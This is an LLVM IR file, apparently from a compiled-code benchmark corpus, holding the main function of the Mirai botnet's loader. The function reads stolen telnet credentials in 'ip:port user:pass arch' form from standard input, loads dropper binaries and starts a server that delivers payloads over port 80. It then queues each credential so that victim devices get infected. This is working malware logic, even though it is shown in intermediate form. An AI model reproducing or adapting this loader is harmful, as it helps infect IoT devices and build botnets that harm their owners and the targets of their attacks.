; ModuleID = '/home/carl/AnghaBench/Mirai-Source-Code/loader/src/extr_main.c_main.c'
source_filename = "/home/carl/AnghaBench/Mirai-Source-Code/loader/src/extr_main.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i32, i32 }
%struct.telnet_info = type { i32 }

@.str = private unnamed_addr constant [12 x i8] c"192.168.0.1\00", align 1
@.str.1 = private unnamed_addr constant [12 x i8] c"192.168.1.1\00", align 1
@id_tag = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [38 x i8] c"Failed to load bins/dlr.* as dropper\0A\00", align 1
@_SC_NPROCESSORS_ONLN = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [16 x i8] c"100.200.100.100\00", align 1
@srv = common dso_local global %struct.TYPE_4__* null, align 8
@.str.4 = private unnamed_addr constant [39 x i8] c"Failed to initialize server. Aborting\0A\00", align 1
@stats_thread = common dso_local global i32 0, align 4
@TRUE = common dso_local global i64 0, align 8
@stdin = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [68 x i8] c"Failed to parse telnet info: \22%s\22 Format -> ip:port user:pass arch\0A\00", align 1
@.str.6 = private unnamed_addr constant [15 x i8] c"srv == NULL 2\0A\00", align 1
@.str.7 = private unnamed_addr constant [19 x i8] c"Hit end of input.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32*, align 8
  %9 = alloca i64, align 8
  %10 = alloca %struct.telnet_info, align 4
  %11 = alloca [1024 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i64 0, i64* %9, align 8
  store i32 2, i32* %7, align 4
  %12 = load i32, i32* %7, align 4
  %13 = call i32* @calloc(i32 %12, i32 4)
  store i32* %13, i32** %8, align 8
  %14 = call i32 @inet_addr(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str, i64 0, i64 0))
  %15 = load i32*, i32** %8, align 8
  %16 = getelementptr inbounds i32, i32* %15, i64 0
  store i32 %14, i32* %16, align 4
  %17 = call i32 @inet_addr(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i64 0, i64 0))
  %18 = load i32*, i32** %8, align 8
  %19 = getelementptr inbounds i32, i32* %18, i64 1
  store i32 %17, i32* %19, align 4
  %20 = load i32, i32* %4, align 4
  %21 = icmp eq i32 %20, 2
  br i1 %21, label %22, label %26

22:                                               ; preds = %2
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 1
  %25 = load i8*, i8** %24, align 8
  store i8* %25, i8** @id_tag, align 8
  br label %26

26:                                               ; preds = %22, %2
  %27 = call i32 (...) @binary_init()
  %28 = icmp ne i32 %27, 0
  br i1 %28, label %31, label %29

29:                                               ; preds = %26
  %30 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.2, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %97

31:                                               ; preds = %26
  %32 = load i32, i32* @_SC_NPROCESSORS_ONLN, align 4
  %33 = call i32 @sysconf(i32 %32)
  %34 = load i32, i32* %7, align 4
  %35 = load i32*, i32** %8, align 8
  %36 = call %struct.TYPE_4__* @server_create(i32 %33, i32 %34, i32* %35, i32 65536, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i64 0, i64 0), i32 80, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i64 0, i64 0))
  store %struct.TYPE_4__* %36, %struct.TYPE_4__** @srv, align 8
  %37 = icmp eq %struct.TYPE_4__* %36, null
  br i1 %37, label %38, label %40

38:                                               ; preds = %31
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.4, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %97

40:                                               ; preds = %31
  %41 = load i32, i32* @stats_thread, align 4
  %42 = call i32 @pthread_create(i32* %6, i32* null, i32 %41, i32* null)
  br label %43

43:                                               ; preds = %83, %58, %40
  %44 = load i64, i64* @TRUE, align 8
  %45 = icmp ne i64 %44, 0
  br i1 %45, label %46, label %87

46:                                               ; preds = %43
  %47 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %48 = load i32, i32* @stdin, align 4
  %49 = call i32* @fgets(i8* %47, i32 1024, i32 %48)
  %50 = icmp eq i32* %49, null
  br i1 %50, label %51, label %52

51:                                               ; preds = %46
  br label %87

52:                                               ; preds = %46
  %53 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %54 = call i32 @util_trim(i8* %53)
  %55 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %56 = call i64 @strlen(i8* %55)
  %57 = icmp eq i64 %56, 0
  br i1 %57, label %58, label %60

58:                                               ; preds = %52
  %59 = call i32 @usleep(i32 10000)
  br label %43

60:                                               ; preds = %52
  %61 = call i32 @memset(%struct.telnet_info* %10, i32 0, i32 4)
  %62 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %63 = call i32* @telnet_info_parse(i8* %62, %struct.telnet_info* %10)
  %64 = icmp eq i32* %63, null
  br i1 %64, label %65, label %68

65:                                               ; preds = %60
  %66 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %67 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.5, i64 0, i64 0), i8* %66)
  br label %83

68:                                               ; preds = %60
  %69 = load %struct.TYPE_4__*, %struct.TYPE_4__** @srv, align 8
  %70 = icmp eq %struct.TYPE_4__* %69, null
  br i1 %70, label %71, label %73

71:                                               ; preds = %68
  %72 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.6, i64 0, i64 0))
  br label %73

73:                                               ; preds = %71, %68
  %74 = load %struct.TYPE_4__*, %struct.TYPE_4__** @srv, align 8
  %75 = call i32 @server_queue_telnet(%struct.TYPE_4__* %74, %struct.telnet_info* %10)
  %76 = load i64, i64* %9, align 8
  %77 = add nsw i64 %76, 1
  store i64 %77, i64* %9, align 8
  %78 = srem i64 %76, 1000
  %79 = icmp eq i64 %78, 0
  br i1 %79, label %80, label %82

80:                                               ; preds = %73
  %81 = call i32 @sleep(i32 1)
  br label %82

82:                                               ; preds = %80, %73
  br label %83

83:                                               ; preds = %82, %65
  %84 = load %struct.TYPE_4__*, %struct.TYPE_4__** @srv, align 8
  %85 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %84, i32 0, i32 1
  %86 = call i32 @ATOMIC_INC(i32* %85)
  br label %43

87:                                               ; preds = %51, %43
  %88 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.7, i64 0, i64 0))
  br label %89

89:                                               ; preds = %94, %87
  %90 = load %struct.TYPE_4__*, %struct.TYPE_4__** @srv, align 8
  %91 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %90, i32 0, i32 0
  %92 = call i64 @ATOMIC_GET(i32* %91)
  %93 = icmp sgt i64 %92, 0
  br i1 %93, label %94, label %96

94:                                               ; preds = %89
  %95 = call i32 @sleep(i32 1)
  br label %89

96:                                               ; preds = %89
  store i32 0, i32* %3, align 4
  br label %97

97:                                               ; preds = %96, %38, %29
  %98 = load i32, i32* %3, align 4
  ret i32 %98
}

declare dso_local i32* @calloc(i32, i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @binary_init(...) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local %struct.TYPE_4__* @server_create(i32, i32, i32*, i32, i8*, i32, i8*) #1

declare dso_local i32 @sysconf(i32) #1

declare !callback !2 dso_local i32 @pthread_create(i32*, i32*, i32, i32*) #1

declare dso_local i32* @fgets(i8*, i32, i32) #1

declare dso_local i32 @util_trim(i8*) #1

declare dso_local i64 @strlen(i8*) #1

declare dso_local i32 @usleep(i32) #1

declare dso_local i32 @memset(%struct.telnet_info*, i32, i32) #1

declare dso_local i32* @telnet_info_parse(i8*, %struct.telnet_info*) #1

declare dso_local i32 @server_queue_telnet(%struct.TYPE_4__*, %struct.telnet_info*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @ATOMIC_INC(i32*) #1

declare dso_local i64 @ATOMIC_GET(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{!3}
!3 = !{i64 2, i64 3, i1 false}
